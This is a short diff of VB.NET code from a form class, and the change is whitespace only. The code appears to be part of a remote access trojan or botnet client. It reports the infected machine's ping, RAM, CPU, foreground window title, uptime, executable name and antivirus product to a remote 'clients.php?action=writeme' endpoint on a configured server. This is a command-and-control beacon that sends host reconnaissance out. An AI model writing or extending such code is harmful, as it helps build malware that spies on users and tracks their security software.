@@ -70,13 +70,13 @@ Public Class MainForm
         Dim GetCPU As String = String.Format("{0:f0}", Convert.ToSingle(cpuCounter.NextValue()))
 
         Dim apiResponse As String = New WebClient().DownloadString(My.Settings.vpsurl &
-        "clients.php?action=writeme&ping=" & GetPing() &
-        "&ram=" & GetGBRamAmount() &
-        "&cpu=" & GetCPU &
-        "&currentwindow=" & GetCaption() &
-        "&uptime=" & upTime &
-        "&softwarename=" & GetExeName() &
-        "&avname=" & GetAntivirus()
+            "clients.php?action=writeme&ping=" & GetPing() &
+            "&ram=" & GetGBRamAmount() &
+            "&cpu=" & GetCPU &
+            "&currentwindow=" & GetCaption() &
+            "&uptime=" & upTime &
+            "&softwarename=" & GetExeName() &
+            "&avname=" & GetAntivirus()
         )
 
         upTime += 1
